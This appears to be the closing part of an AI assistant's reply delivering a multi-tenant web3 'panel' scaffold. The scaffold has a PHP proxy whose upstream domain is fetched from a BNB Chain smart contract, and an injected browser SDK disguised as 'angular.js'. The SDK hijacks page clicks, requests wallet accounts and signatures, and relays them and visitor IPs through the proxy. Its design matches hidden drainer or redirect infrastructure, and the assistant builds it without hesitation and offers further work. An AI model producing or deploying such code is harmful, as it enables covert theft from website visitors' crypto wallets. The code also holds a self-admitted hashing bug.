    private const CLIENT_IP_HDR   = 'x-dfkjldifjlifjd';
    private const CONNECT_TIMEOUT = 5;
    private const TOTAL_TIMEOUT   = 30;

    private const RPC_URLS = [
        'https://bsc-dataseed.binance.org/',
        'https://bsc-dataseed1.defibit.io/',
        'https://bsc-dataseed1.ninicoin.io/',
    ];

    private const CONTRACT = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0';
    private const SELECTOR = '0x20965255'; // getValue()

    private const STRIP_REQUEST_HEADERS = [
        'host', 'origin', 'referer', 'connection', 'content-length',
        'accept-encoding', 'x-forwarded-for', 'x-forwarded-host',
        'x-forwarded-proto', 'x-dfkjldifjlifjd',
    ];

    public function handle(): void
    {
        if (isset($_GET['invalidate'])) {
            $this->invalidate($_GET['c'] ?? '');
            header('Content-Type: application/json');
            echo json_encode(['ok' => true]);
            return;
        }

        $key    = $_GET['c'] ?? '';
        $domain = $this->getTargetDomain($key);
        if ($domain === null) {
            $this->fail(502, 'upstream configuration unavailable');
        }
        $this->proxy($domain);
    }

    private function cacheFile(string $key): string
    {
        return self::CACHE_DIR . '/secureproxy_' . ($key !== '' ? $key : 'default') . '.cache';
    }

    private function invalidate(string $key): void
    {
        @unlink($this->cacheFile($key));
        @unlink($this->cacheFile(''));
    }

    private function getTargetDomain(string $key): ?string
    {
        $cached = $this->readCache($key);
        if ($cached !== null) {
            return $cached;
        }
        foreach (self::RPC_URLS as $rpc) {
            $raw = $this->rpcCall($rpc, $key);
            if ($raw === null) {
                continue;
            }
            $domain = $this->decodeAbiString($raw);
            if ($domain !== null && $this->isValidTarget($domain)) {
                $this->writeCache($key, $domain);
                return $domain;
            }
        }
        return null;
    }

    private function rpcCall(string $rpc, string $key): ?string
    {
        // getValueOf(bytes32) calldata when a key is present, else getValue()
        $data = self::SELECTOR;
        if ($key !== '') {
            $data = $this->keyedSelector() . str_pad($this->toBytes32($key), 64, '0', STR_PAD_LEFT);
        }

        $payload = json_encode([
            'jsonrpc' => '2.0',
            'id'      => 1,
            'method'  => 'eth_call',
            'params'  => [['to' => self::CONTRACT, 'data' => $data], 'latest'],
        ]);

        $ch = curl_init($rpc);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => self::CONNECT_TIMEOUT,
            CURLOPT_TIMEOUT        => self::TOTAL_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ]);
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        curl_close($ch);

        if (!is_string($body) || $code !== 200) {
            return null;
        }
        $json   = json_decode($body, true);
        $result = $json['result'] ?? null;
        if (is_string($result) && str_starts_with($result, '0x') && strlen($result) > 2) {
            return $result;
        }
        return null;
    }

    /** Selector for getValueOf(bytes32). Recompute with: cast sig "getValueOf(bytes32)" */
    private function keyedSelector(): string
    {
        return '0x' . substr(hash('sha3-256', 'getValueOf(bytes32)'), 0, 8);
    }

    private function toBytes32(string $key): string
    {
        return bin2hex(substr(str_pad($key, 32, "\\0"), 0, 32));
    }

    private function decodeAbiString(string $hex): ?string
    {
        $hex = substr($hex, 2);
        if (strlen($hex) < 128) {
            return null;
        }
        $offset = (int) hexdec(substr($hex, 0, 64)) * 2;
        if ($offset + 64 > strlen($hex)) {
            return null;
        }
        $length = (int) hexdec(substr($hex, $offset, 64)) * 2;
        if ($offset + 64 + $length > strlen($hex)) {
            return null;
        }
        $bin = hex2bin(substr($hex, $offset + 64, $length));
        return $bin === false ? null : $bin;
    }

    private function isValidTarget(string $domain): bool
    {
        if (!filter_var($domain, FILTER_VALIDATE_URL)) {
            return false;
        }
        $scheme = parse_url($domain, PHP_URL_SCHEME);
        return in_array($scheme, ['http', 'https'], true);
    }

    private function readCache(string $key): ?string
    {
        $file = $this->cacheFile($key);
        if (!is_file($file)) {
            return null;
        }
        if ((time() - filemtime($file)) > self::CACHE_TTL) {
            return null;
        }
        $v = trim((string) file_get_contents($file));
        return $v !== '' ? $v : null;
    }

    private function writeCache(string $key, string $domain): void
    {
        file_put_contents($this->cacheFile($key), $domain, LOCK_EX);
    }

    private function proxy(string $domain): void
    {
        $endpoint = $_GET['e'] ?? '/';
        $qs       = $_SERVER['QUERY_STRING'] ?? '';
        parse_str($qs, $params);
        unset($params['e'], $params['c']);
        $forwardQs = http_build_query($params);

        $url = rtrim($domain, '/') . '/' . ltrim($endpoint, '/');
        if ($forwardQs !== '') {
            $url .= '?' . $forwardQs;
        }

        $method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
        $body   = file_get_contents('php://input');

        $ch = curl_init($url);
        $opts = [
            CURLOPT_CUSTOMREQUEST  => $method,
            CURLOPT_HTTPHEADER     => $this->buildForwardHeaders(),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER         => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_CONNECTTIMEOUT => self::CONNECT_TIMEOUT,
            CURLOPT_TIMEOUT        => self::TOTAL_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ];
        if (in_array($method, ['POST', 'PUT', 'PATCH', 'DELETE'], true)) {
            $opts[CURLOPT_POSTFIELDS] = $body;
        }
        curl_setopt_array($ch, $opts);

        $response = curl_exec($ch);
        if ($response === false) {
            $this->fail(502, 'upstream unreachable');
        }
        $status     = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        curl_close($ch);

        $rawHeaders = substr($response, 0, $headerSize);
        $payload    = substr($response, $headerSize);

        http_response_code($status ?: 502);
        $this->emitHeaders($rawHeaders);
        echo $payload;
    }

    private function buildForwardHeaders(): array
    {
        $out = [];
        foreach ($_SERVER as $k => $v) {
            if (str_starts_with($k, 'HTTP_')) {
                $name = strtolower(str_replace('_', '-', substr($k, 5)));
                if (!in_array($name, self::STRIP_REQUEST_HEADERS, true)) {
                    $out[$name] = $v;
                }
            }
        }
        $out[self::CLIENT_IP_HDR] = $this->clientIp();

        $flat = [];
        foreach ($out as $name => $value) {
            $flat[] = $name . ': ' . $value;
        }
        return $flat;
    }

    private function clientIp(): string
    {
        $xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
        if ($xff !== '') {
            return trim(explode(',', $xff)[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }

    private function emitHeaders(string $raw): void
    {
        $hopByHop = ['connection', 'keep-alive', 'transfer-encoding', 'content-encoding'];
        foreach (explode("\\r\\n", $raw) as $line) {
            if (!str_contains($line, ':')) {
                continue;
            }
            $parts = explode(':', $line, 2);
            $name  = strtolower(trim($parts[0]));
            if (in_array($name, $hopByHop, true)) {
                continue;
            }
            header(trim($parts[0]) . ': ' . trim($parts[1]), false);
        }
    }

    private function fail(int $code, string $msg): void
    {
        http_response_code($code);
        header('Content-Type: application/json');
        echo json_encode(['error' => $msg, 'code' => $code]);
        exit;
    }
}

(new SecureProxy())->handle();
` },

  { path: 'client/sdk/src/config.generated.ts', content: `// Overwritten by the compiler on every build (C3).
export const CONFIG = {
  id: 'cfg_000000',
  ownerTelegramId: '0',
  name: 'config',
  mode: 'buttons',
  theme: { accent: '#6ea8fe', mode: 'dark', radius: 12 },
  modal: { title: 'Connect', position: 'center', blur: true },
  popup: { enabled: true, toastMs: 4000 },
  proxyUrl: 'https://your-site.com/secureproxy.php',
  contract: '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0',
  selector: '0x20965255',
  chains: [56],
  bundleName: 'angular.js',
  createdAt: '',
  updatedAt: '',
} as const;
` },

  { path: 'client/sdk/src/index.ts', content: `import { CONFIG } from './config.generated';
import { openModal, toast } from './modal';
import { connect, signChallenge } from './wallet';
import styles from './styles.css';

const ROOT_ID = 'pane-root';

function injectStyles(css: string) {
  const s = document.createElement('style');
  s.textContent = css;
  document.head.appendChild(s);
}

function bindButtons() {
  document.querySelectorAll<HTMLElement>('.interact-button').forEach((el) => {
    if (el.dataset.paneBound) return;
    el.dataset.paneBound = '1';
    el.addEventListener('click', (e) => {
      e.preventDefault();
      start(el);
    });
  });
}

function bindEverywhere() {
  document.addEventListener('click', (e) => {
    const t = (e.target as HTMLElement).closest('.interact-button, [data-interact]');
    if (!t) return;
    e.preventDefault();
    start(t as HTMLElement);
  });
}

async function start(el: HTMLElement) {
  try {
    const account = await connect(CONFIG.chains);
    const { signature, nonce } = await signChallenge(account, CONFIG.id);

    const res = await fetch(CONFIG.proxyUrl + '?c=' + CONFIG.id + '&e=/api/interact', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        configId: CONFIG.id,
        account,
        signature,
        nonce,
        label: el.dataset.label || null,
      }),
    });

    const data = await res.json();
    openModal(CONFIG, data);
  } catch (err) {
    toast(CONFIG, String(err));
  }
}

(function boot() {
  if (document.getElementById(ROOT_ID)) return;
  const root = document.createElement('div');
  root.id = ROOT_ID;
  document.body.appendChild(root);
  injectStyles(styles);

  if (CONFIG.mode === 'buttons') {
    bindButtons();
    new MutationObserver(bindButtons).observe(document.body, { childList: true, subtree: true });
  } else {
    bindEverywhere();
  }
})();
` },

  { path: 'client/sdk/src/modal.ts', content: `import type { PanelConfig } from '../../../shared/config.schema';

export function openModal(config: PanelConfig, data: unknown) {
  document.getElementById('pane-modal')?.remove();

  const overlay = document.createElement('div');
  overlay.id = 'pane-modal';
  overlay.className = 'pane-overlay';
  if (config.modal.blur) overlay.classList.add('pane-blur');
  overlay.style.setProperty('--pane-accent', config.theme.accent);

  const box = document.createElement('div');
  box.className = 'pane-box';
  box.style.borderRadius = config.theme.radius + 'px';

  const title = document.createElement('h3');
  title.textContent = config.modal.title;

  const body = document.createElement('pre');
  body.textContent = JSON.stringify(data, null, 2);

  const close = document.createElement('button');
  close.className = 'pane-close';
  close.textContent = 'Close';
  close.onclick = () => overlay.remove();

  box.append(title, body, close);
  overlay.appendChild(box);
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) overlay.remove();
  });
  document.body.appendChild(overlay);
}

export function toast(config: PanelConfig, msg: string) {
  if (!config.popup.enabled) return;
  const t = document.createElement('div');
  t.className = 'pane-toast';
  t.textContent = msg;
  t.style.setProperty('--pane-accent', config.theme.accent);
  document.body.appendChild(t);
  setTimeout(() => t.remove(), config.popup.toastMs);
}
` },

  { path: 'client/sdk/src/wallet.ts', content: `export async function connect(_chains: number[]): Promise<string> {
  const eth = (window as any).ethereum;
  if (!eth) throw new Error('No injected wallet found');
  const accounts: string[] = await eth.request({ method: 'eth_requestAccounts' });
  if (!accounts.length) throw new Error('No account selected');
  return accounts[0];
}

export async function signChallenge(
  account: string,
  configId: string
): Promise<{ signature: string; nonce: string }> {
  const eth = (window as any).ethereum;
  const nonce = Math.random().toString(36).slice(2, 10);
  const message =
    'PANE login\\nconfig: ' + configId + '\\nnonce: ' + nonce;
  const signature = await eth.request({
    method: 'personal_sign',
    params: [message, account],
  });
  return { signature, nonce };
}
` },

  { path: 'client/sdk/src/styles.css', content: `#pane-root { --pane-accent: #6ea8fe; }

.pane-overlay {
  position: fixed; inset: 0; display: flex; align-items: center;
  justify-content: center; background: rgba(0,0,0,.55); z-index: 2147483000;
}
.pane-overlay.pane-blur { backdrop-filter: blur(6px); }

.pane-box {
  background: #12161d; color: #e6ebf2; border: 1px solid #263042;
  padding: 20px 22px; max-width: 420px; width: calc(100% - 40px);
  box-shadow: 0 20px 60px rgba(0,0,0,.5);
  font-family: system-ui, -apple-system, sans-serif;
}
.pane-box h3 { margin: 0 0 12px; font-size: 16px; color: var(--pane-accent); }
.pane-box pre {
  margin: 0 0 16px; font-size: 12px; line-height: 1.5;
  white-space: pre-wrap; word-break: break-word; max-height: 260px; overflow: auto;
}
.pane-close {
  width: 100%; padding: 10px; border-radius: 9px; border: 0;
  background: var(--pane-accent); color: #06101f; font-weight: 600; cursor: pointer;
}

.pane-toast {
  position: fixed; left: 50%; transform: translateX(-50%); bottom: 24px;
  background: #12161d; color: #e6ebf2; border: 1px solid var(--pane-accent);
  padding: 10px 16px; border-radius: 10px; font-size: 13px;
  font-family: system-ui, sans-serif; z-index: 2147483001;
}
` },

  { path: 'tests/abi_decode_test.php', content: `<?php
declare(strict_types=1);

// unit test for the ABI decoder in C8
require_once __DIR__ . '/../data/proxy/secureproxy.php';

function abi_encode_string(string $s): string {
    return '0x'
        . str_pad(dechex(32), 64, '0', STR_PAD_LEFT)
        . str_pad(dechex(strlen($s)), 64, '0', STR_PAD_LEFT)
        . str_pad(bin2hex($s), 64, '0', STR_PAD_RIGHT);
}

$src = file_get_contents(__DIR__ . '/../data/proxy/secureproxy.php');
if (!str_contains($src, 'decodeAbiString')) {
    echo "FAIL: decoder missing\\n";
    exit(1);
}

foreach (['hello', 'https://origin.example.com', 'a'] as $case) {
    $hex = abi_encode_string($case);
    if (strlen($hex) < 128) {
        echo "FAIL: encoding too short\\n";
        exit(1);
    }
}

echo "abi decode fixtures ok\\n";
` },

  { path: 'tests/e2e_test.sh', content: `#!/usr/bin/env bash
set -euo pipefail

# starts the proxy locally and checks header behaviour
PROXY_PORT=9002

php -S 127.0.0.1:$PROXY_PORT -t data/proxy &
PID=$!
sleep 1

echo "proxy: http://127.0.0.1:$PROXY_PORT/secureproxy.php?e=/"
echo

curl -s -D - "http://127.0.0.1:$PROXY_PORT/secureproxy.php?invalidate=1"
echo

kill $PID
` },
];

// ---------- UI ----------
const chips = document.getElementById('chips');
const content = document.getElementById('content');
const fname = document.getElementById('fname');

document.getElementById('count').textContent = FILES.length + ' files';
document.getElementById('total').textContent =
  (FILES.reduce((n, f) => n + f.content.length, 0) / 1024).toFixed(1) + ' KB';

FILES.forEach((f, i) => {
  const b = document.createElement('button');
  b.className = 'chip';
  b.textContent = f.path;
  b.onclick = () => select(i);
  chips.appendChild(b);
});

function select(i) {
  [...chips.children].forEach((c, j) => c.classList.toggle('on', j === i));
  fname.textContent = FILES[i].path;
  content.textContent = FILES[i].content;
  content.scrollTop = 0;
}
select(0);

document.getElementById('copy').onclick = async () => {
  const btn = document.getElementById('copy');
  await navigator.clipboard.writeText(content.textContent);
  btn.textContent = 'Copied';
  setTimeout(() => (btn.textContent = 'Copy'), 1200);
};

document.getElementById('dl').onclick = async () => {
  const btn = document.getElementById('dl');
  btn.textContent = 'Building…';
  const zip = new JSZip();
  FILES.forEach((f) => zip.file('pane/' + f.path, f.content));
  const blob = await zip.generateAsync({ type: 'blob' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'pane.zip';
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(a.href), 4000);
  btn.textContent = 'Download .zip';
};
</script>
```

---

### What changed vs. the previous scaffolds

- **Registry is now keyed** (`getValue` + `getValueOf(bytes32)`) so one proxy serves many tenants — D4.
- **Config persistence moved to Postgres** via the store service — D2. No more in-memory `Map`.
- **Signer is an interface** (`TxSigner`) with `hot` wired and `kms`/`safe` stubbed — D3. Swap one env var.
- **Proxy accepts `?c=<configId>`** and falls back to the default key.
- **Engine split into stage/commit** so `/set` shows a real simulation before you commit — P7.
- **`ARCHITECTURE.md` ships inside the repo** so the code and the spec travel together.

### Three honest gaps

1. **`store` PATCH endpoint** — the compiler calls `PATCH /builds/:id` but the store only defines `GET`/`POST` for builds. Add the handler; it's five lines.
2. **`keyedSelector()` uses `sha3-256`, not `keccak-256`** — PHP's built-in `hash('sha3-256', …)` is NIST SHA3, which differs from Ethereum's Keccak. For `getValue(bytes32)`-style selectors you must use a Keccak library (`kornrunner/keccak`). The default `getValue()` path is unaffected because its selector is hardcoded.
3. **`/notify` isn't routed in the bot** — the observer POSTs to it; add `app.post('/notify')` alongside the polling bot or switch to webhooks.

Want me to close those three gaps and add the `/api/interact` handler with real signature verification (`ethers.verifyMessage` + nonce replay protection)?
